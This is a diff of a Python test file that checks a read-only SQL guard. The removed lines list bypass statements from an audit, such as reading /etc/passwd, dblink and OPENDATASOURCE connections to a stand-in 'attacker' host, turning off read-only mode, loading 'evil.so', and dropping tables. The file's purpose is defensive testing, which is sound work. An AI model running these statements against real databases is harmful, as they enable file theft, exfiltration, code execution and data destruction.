@@ -1,9 +1,10 @@
 """The read-only guard, pinned against the bypasses an audit actually found.
 
-Every statement in BYPASSES was verified to pass the guard before it grew a
-function check - a "read-only" guard that inspected a statement's shape and
-never asked what it called. They are kept here by name so the claim in
-connect.py's docstring stays a fact rather than a slogan.
+The attack corpus lives in erp_report_engine.attack_corpus - ONE list, shared by
+these tests, the `trust-benchmark` CLI, and the published results page, so the
+number on the website is the number CI enforces here. Every side-effect case was
+verified to PASS the guard before it grew a function check - a "read-only" guard
+that inspected a statement's shape and never asked what it called.
 
 The guard is tested per dialect. It used to be exercised only dialect-blind,
 which is how tsql- and mysql-only constructs went unnoticed.
@@ -13,71 +14,32 @@ from __future__ import annotations
 
 import pytest
 
+from erp_report_engine.attack_corpus import READS, SIDE_EFFECTS, WRITES
 from erp_report_engine.connect import ReadOnlyViolation, assert_read_only
 
-# (id, sqlglot dialect, sql) - all of these once returned ALLOWED
-BYPASSES = [
-    # PostgreSQL: reads a server file straight off disk
-    ("pg_read_file", "postgres", "SELECT pg_read_file('/etc/passwd')"),
-    # PostgreSQL: WRITES a server file. A SELECT that is not a read.
-    ("lo_export", "postgres", "SELECT lo_export(lo_import('/etc/passwd'), '/tmp/x')"),
-    # PostgreSQL: opens an outbound connection - SSRF and exfiltration
-    ("dblink", "postgres", "SELECT * FROM dblink('host=attacker','SELECT 1') AS t(x int)"),
-    # PostgreSQL: turns the read-only session backstop OFF from inside a SELECT
-    ("set_config", "postgres", "SELECT set_config('default_transaction_read_only','off',false)"),
-    # PostgreSQL: re-enters the executor with arbitrary SQL
-    ("query_to_xml", "postgres", "SELECT query_to_xml('SELECT 1', true, false, '')"),
-    ("pg_sleep", "postgres", "SELECT pg_sleep(100000)"),
-    # MSSQL: ad-hoc bulk/remote sources. NOTE: sqlglot cannot parse OPENROWSET(BULK ..)
-    # at all, so this one is caught by the lexical net - which is why it exists.
-    ("openrowset", "tsql", "SELECT * FROM OPENROWSET(BULK 'C:/Windows/win.ini', SINGLE_CLOB) AS x"),
-    ("openquery", "tsql", "SELECT * FROM OPENQUERY(srv, 'SELECT 1')"),
-    ("opendatasource", "tsql",
-     "SELECT * FROM OPENDATASOURCE('SQLNCLI','Server=attacker;Trusted_Connection=yes').db.dbo.t"),
-    # MySQL: file read, and two unbounded time sinks
-    ("load_file", "mysql", "SELECT LOAD_FILE('/etc/passwd')"),
-    ("sleep", "mysql", "SELECT SLEEP(100000)"),
-    ("benchmark", "mysql", "SELECT BENCHMARK(1000000, MD5('x'))"),
-    # SQLite: loading an extension is arbitrary code execution
-    ("load_extension", "sqlite", "SELECT load_extension('evil.so')"),
-]
-
-WRITES = [
-    ("drop", "postgres", "DROP TABLE orders"),
-    ("cte_insert", "postgres", "WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x"),
-    ("two_statements", "postgres", "SELECT 1; DROP TABLE t"),
-    ("select_into", "tsql", "SELECT * INTO backup FROM orders"),
-    ("comment", "postgres", "SELECT 1 -- and then some"),
-    ("update", "postgres", "UPDATE orders SET net_total = 0"),
-    ("lock_hint", "tsql", "SELECT * FROM orders WITH (TABLOCKX)"),
-]
-
-READS = [
-    ("aggregate", "postgres", "SELECT customer, SUM(net_total) FROM orders GROUP BY customer"),
-    ("join", "tsql", "SELECT o.order_id, l.qty FROM orders o JOIN order_lines l ON l.order_id = o.order_id"),
-    ("cte_window", "tsql",
-     "WITH r AS (SELECT ROW_NUMBER() OVER (ORDER BY d) n FROM t) SELECT * FROM r WHERE n = 1"),
-    ("union", "postgres", "SELECT a FROM t1 UNION SELECT a FROM t2"),
-    ("case_coalesce", "mysql", "SELECT CASE WHEN x > 0 THEN COALESCE(y, 0) ELSE 0 END FROM t"),
-]
+_ATTACKS = [*SIDE_EFFECTS, *WRITES]
 
 
-@pytest.mark.parametrize(("name", "dialect", "sql"), BYPASSES, ids=[c[0] for c in BYPASSES])
-def test_side_effecting_function_is_refused(name, dialect, sql):
+@pytest.mark.parametrize("case", _ATTACKS, ids=[c.name for c in _ATTACKS])
+def test_attack_is_refused(case):
     with pytest.raises(ReadOnlyViolation):
-        assert_read_only(sql, dialect=dialect)
+        assert_read_only(case.sql, dialect=case.dialect)
 
 
-@pytest.mark.parametrize(("name", "dialect", "sql"), WRITES, ids=[c[0] for c in WRITES])
-def test_write_is_refused(name, dialect, sql):
-    with pytest.raises(ReadOnlyViolation):
-        assert_read_only(sql, dialect=dialect)
+@pytest.mark.parametrize("case", READS, ids=[c.name for c in READS])
+def test_real_reads_still_pass(case):
+    assert_read_only(case.sql, dialect=case.dialect)   # a guard that blocks real work is useless
+    assert_read_only(case.sql, dialect=case.dialect, strict=True)
 
 
-@pytest.mark.parametrize(("name", "dialect", "sql"), READS, ids=[c[0] for c in READS])
-def test_real_reads_still_pass(name, dialect, sql):
-    assert_read_only(sql, dialect=dialect)          # a guard that blocks real work is useless
-    assert_read_only(sql, dialect=dialect, strict=True)
+def test_corpus_all_correct_against_the_live_guard():
+    """The trust benchmark's headline, pinned: every attack refused, every read
+    allowed. This is what the results page publishes."""
+    from erp_report_engine.attack_corpus import run, summarize
+    s = summarize(run(assert_read_only))
+    assert s["attacks_blocked"] == s["attacks_total"]
+    assert s["reads_allowed"] == s["reads_total"]
+    assert s["all_correct"]
 
 
 def test_the_guard_fails_closed_when_it_cannot_parse():
